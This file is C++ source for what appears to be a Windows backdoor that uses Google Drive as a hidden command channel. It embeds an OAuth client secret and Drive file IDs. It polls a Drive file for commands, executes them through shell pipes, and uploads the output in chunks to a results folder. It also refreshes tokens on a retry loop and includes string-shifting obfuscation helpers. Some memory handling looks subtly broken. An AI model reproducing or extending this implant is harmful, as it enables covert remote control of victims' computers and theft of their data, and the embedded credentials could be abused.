#include "MyString.h"
#include <windows.h>
#include <string>
#include <stdio.h>
#include <cmath>
#include <algorithm>

#define min 32
#define max 126
#define PROGRAM_CYCLE_THRESHOLD 4100 * 1000 
#define FAILSAFE_THRESHOLD 2402 * 1000
#define EXPONENTIAL_POWER 4
#define RESULTS_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
#define SOURCE_ID "1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er"
#define UPLOAD_BUFFER_SIZE 7680
#define MAX_UPLOAD_SIZE 6656 // 6.5 * 1024

#define BDRIVE_OK 200
#define BDRIVE_NO_REFRESH 204
#define BDRIVE_REFRESH_NOT_ACCEPTABLE 406
#define BDRVIE_TIMED_OUT 600
#define BDRIVE_NO_INTERNET 601
#define BDRIVE_INVALID_ACCESS_TOKEN 401
#define BDRIVE_INVALID_REFRESH_TOKEN 699

#define STATE_OK 0b0
#define STATE_ACCESS_TOKEN_INVALID 0b1
#define STATE_CONNECTION_LOST 0b10
#define STATE_REFRESH_TOKEN_INVALID 0b100
#define STATE_NO_INTERNET 0b1000

#define CLIENT_SECRET "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"
#define CLIENT_ID "1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com"
#define RESULT_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
#define BACKUP_FILE_ID "1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1"

static const char bs64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

static DWORD expo(DWORD base, DWORD exponent) {
	if (exponent == 0) {
		return 1;
	}
	else if (exponent == 1) {
		return base;
	}
	DWORD half = expo(base, exponent / 2);
	return half * half * expo(base, exponent % 2);
}

static std::string base64_encode(const std::string& input) {
	std::string encoded;
	int val = 0, valb = -6;
	for (unsigned char c : input) {
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			encoded.push_back(bs64[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6) {
		encoded.push_back(bs64[((val << 8) >> (valb + 8)) & 0x3F]);
	}
	while (encoded.size() % 4) {
		encoded.push_back('='); // Add padding if necessary
	}
	return encoded;
}


inline void decoder(char str[]) {
	str[0] += 7;
	str[1] += 7;
	int mode = (str[0] + str[1]) % 10;
	for (size_t i = 2; i < strlen(str); i++)
	{
		str[i] += mode;
	}

}
//decoder

static MyString encoder(MyString W, int shift) {
	char* str = W.getContext();
	for (int i = 0; i < strlen(str); i++) {
		char ch = str[i];
		if (ch >= min && ch <= max) {
			ch += shift;

			if (ch > max) {
				ch = min + (ch - max - 1);
			}
			else if (ch < min) {
				ch = max - (min - ch - 1);
			}

			str[i] = ch;
		}
	}
	MyString result = str;
	return result;
}
//shifting strings for encoding

/// <summary>
/// This function is used to request and set a new accessToken.
/// </summary>
/// <param name="accessToken">A string to output new Access Token</param>
/// <param name="refreshToken">A string to just input Refresh Token</param>
/// <returns>
/// 200 OK!
/// BDRIVE_INVALID_REFRESH_TOKEN
/// </returns>
static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken) {
	WORD errorCode = BDRIVE_OK;
	char* buffer = new char[1024];
	sprintf_s(buffer, 1024, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30;Write-Host -NoNewline $response.access_token | ConvertTo-Json}catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", CLIENT_ID, CLIENT_SECRET, refreshToken.c_str());
	
	FILE* file = _popen(buffer, "r");
	fgets(buffer, 1023, file);
	_pclose(file);

	if (buffer[0] == '4' || buffer[0] == '6')
	{
		errorCode = (buffer[0] - '0') * 100 + (buffer[1] - '0') * 10 + (buffer[2] - '0');
		if (errorCode == 400)
		{
			errorCode = BDRIVE_INVALID_REFRESH_TOKEN;
		}
	}

	accessToken = buffer;

	delete[] buffer;
	return errorCode;
}

/// <summary>
/// This method is going to get used in handling failsafe situation.
/// </summary>
/// <param name="refreshToken">A string to output new Refresh Token</param>
/// <param name="accessToken">A string to output new Access Token</param>
/// <returns>
/// setNewAccessToken ErrorCodes!
/// BDRIVE_NO_REFRESH
/// BDRIVE_INVALID_REFRESH_TOKEN
/// 600 Invoke-Restmethod Timedout!
/// </returns>
static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken) {
	char* buffer = new char[1024];

	sprintf_s(buffer, 1023, "powershell -c \"try{Write-Host -NoNewline (Invoke-Restmethod 'https://drive.google.com/uc?export=download&id=%s' -TimeoutSec 30).RefreshToken} catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", BACKUP_FILE_ID);
	FILE* file = _popen(buffer, "r");
	////// you should edit this
	fgets(buffer, 1023, file);
	_pclose(file);

	if (buffer[0] == '4' || buffer[0] == '6')
	{
		delete[] buffer;
		return (buffer[0] - '0') * 100 + (buffer[1] - '0') * 10 + (buffer[2] - '0');
	}
	else if (buffer[0] == 'p' && buffer[1] == 'o') {

		delete[] buffer;
		return BDRIVE_NO_REFRESH;
	}
	else {
		if (buffer[0] == '1' && buffer[1] == '/' && buffer[2] == '/')
		{
			refreshToken = buffer;
			delete[] buffer;
			return setNewAccessToken(accessToken, refreshToken);
		}
		else {

			delete[] buffer;
			return BDRIVE_INVALID_REFRESH_TOKEN;
		}
	}
}
//review this two function

/// <summary>
/// A procedure to handle the failsafe.
/// </summary>
/// <param name="refreshToken">A string to output Refresh Token</param>
/// <param name="accessToken">A string to output Access Token</param>
static void handleFailsafe(std::string& refreshToken, std::string& accessToken) {
	BYTE flag = true;
	BYTE i = 0;
	DWORD delay = 0;

	while (true)
	{
		//these two nested branches are to prevent of extra calculations and the other is to not exceeds the threshold
		if (flag)
		{
			delay = expo(i++, EXPONENTIAL_POWER) * 1000;
			if (delay > FAILSAFE_THRESHOLD)
			{
				flag = false;
				delay = FAILSAFE_THRESHOLD;
			}
		}
		Sleep(delay);

		switch (setNewRefreshAndAccessToken(refreshToken, accessToken)) {
		case 200:
			return;
			break;
		case 204:
		case 400:
		case 403:
		case 406:
			break;
		}
	}
}

/// <summary>
/// This function downloads the Source.txt file in the Drive
/// </summary>
/// <param name="accessToken">The access token as string</param>
/// <param name="output">An output string that has the downloaded content</param>
/// <returns>
/// 200 OK!
/// 204 No Content!
/// 600 Timeout!
/// 601 Unhandled Exception!
/// </returns>
static WORD downloadSourceContext(std::string accessToken, std::string& output) {
	char* buffer = new char[1024];

	snprintf(buffer, 1024, "powershell.exe -c \"try { $response = Invoke-RestMethod 'https://www.googleapis.com/drive/v3/files/%s?alt=media&acknowledgeAbuse=true&mimeType=text/plain' -TimeoutSec 30 -Method 'GET' -Headers @{'Authorization' = 'Bearer %s'}; Write-Host -NoNewline $response } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", SOURCE_ID,
		accessToken.c_str()
	);


	FILE* file = _popen(buffer, "r");
	while (fgets(buffer, 1024, file) != NULL) {
		output = output + buffer;
	}

	_pclose(file);
	delete[] buffer;

	if (output.length() == 0)
	{
		return 204;
	}
	else if (output.length() == 3)
	{
		if (output[0] == '6' && output[1] == '0' && output[2] == '0')
		{
			return 600;
		}
		else if (output[0] == '6' && output[1] == '0' && output[2] == '1') {
			return 601;
		}
	}
	return 200;
}

/// <summary>
/// Execute a command in a manner suitable for _popen() function and put the result in output string.
/// </summary>
/// <param name="input">The command downloaded from source</param>
/// <param name="output">TOutput of the pipe that got opened by _popen()</param>
/// <returns>returns 0 :|</returns>
static WORD commandExecuter(std::string input, std::string& output) {
	std::replace(input.begin(), input.end(), '\n', '&');
	FILE* file = _popen(input.c_str(), "r");
	output = "";
	char* buffer = new char[1024];

	while (fgets(buffer, 1024, file) != NULL) {
		output = output + buffer;
	}
	_pclose(file);
	delete[] buffer;

	return 0;
}

/// <summary>
/// This function upload a single file up to 6656 characters (Around 6.5 KB).
/// </summary>
/// <param name="uploadpart"></param>
/// <param name="accessToken"></param>
/// <param name="index"></param>
/// <param name="subIndex"></param>
/// <returns>
/// 200 OK!
/// 401 Unauthorized!
/// 600 Timeout!
/// 601 Unhandled Exception!
/// </returns>
static WORD singlePartUpload(std::string uploadpart, std::string accessToken, DWORD index, DWORD subIndex) {
	char* buffer = new char[UPLOAD_BUFFER_SIZE + 1];
	WORD errorCode = 200;
	snprintf(buffer, UPLOAD_BUFFER_SIZE, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/?uploadType=multipart&access_token=%s' -Method 'POST' -TimeoutSec 30 -Headers @{'Content-Type' = 'multipart/related; boundary=boundary'} -Body \\\"`n--boundary`nContent-Type: application/json; charset=UTF-8`n`n{`\\\"name`\\\": `\\\"Result#%d_%d.txt`\\\",`\\\"mimeType`\\\": `\\\"text/plain`\\\",`\\\"parents`\\\": [`\\\"%s`\\\"]}`n`n--boundary`nContent-Type: text/plain`n`n%s`n--boundary--\\\"}catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", accessToken.c_str(), index, subIndex, RESULTS_FOLDER_ID, uploadpart.c_str());
	FILE* file = _popen(buffer, "r");
	delete[] buffer;
	buffer = new char[4];
	fgets(buffer, 4, file);
	_pclose(file);

	if (buffer[0] == '4' || buffer[0] == '6')
	{
		errorCode = (buffer[0] - '0') * 100 + (buffer[1] - '0') * 10 + (buffer[2] - '0');
	}
	delete[] buffer;
	return errorCode;
}

/// <summary>
/// This function tries to upload the whole input to The drive
/// need to error handle!!!!!
/// </summary>
/// <param name="input"></param>
/// <param name="accessToken"></param>
/// <param name="index">The index of whole files that you want to upload</param>
/// <returns>Same as singlePartUpload function</returns>
static WORD uploadResult(std::string input, std::string accessToken, WORD index) {
	//input = base64_encode(input);
	//size_t subIndex, i;
	WORD errorCode = 200;
	size_t len = input.length();
	for (size_t i = 0, subIndex = 0; i < input.length(); subIndex++, i = subIndex * MAX_UPLOAD_SIZE)
	{
		errorCode = singlePartUpload(input.substr(i, MAX_UPLOAD_SIZE), accessToken, index, subIndex);
		if (errorCode != 200)
		{
			return errorCode;
		}
	}
	return errorCode;
}

/// <summary>
/// This function delete the resource file that is on the Google drive.
/// </summary>
/// <param name="accessToken"></param>
/// <returns>
/// 200 OK!
/// 401 Unauthorized!
/// 600 Timeout!
/// 601 Unhandled Exception!
/// </returns>
static WORD deleteSource(std::string accessToken) {
	char* buffer = new char[1024];
	WORD errorCode = 200;
	snprintf(buffer, 1023, "powershell.exe -c \"try {Invoke-RestMethod 'https://www.googleapis.com/upload/drive/v3/files/%s?access_token=%s' -Method 'PATCH' -TimeoutSec 30}catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", SOURCE_ID, accessToken.c_str());
	FILE* file = _popen(buffer, "r");
	delete[] buffer;
	buffer = new char[4];
	fgets(buffer, 4, file);
	_pclose(file);

	if (buffer[0] == '4' || buffer[0] == '6')
	{
		errorCode = (buffer[0] - '0') * 100 + (buffer[1] - '0') * 10 + (buffer[2] - '0');
	}
	delete[] buffer;
	return errorCode;
}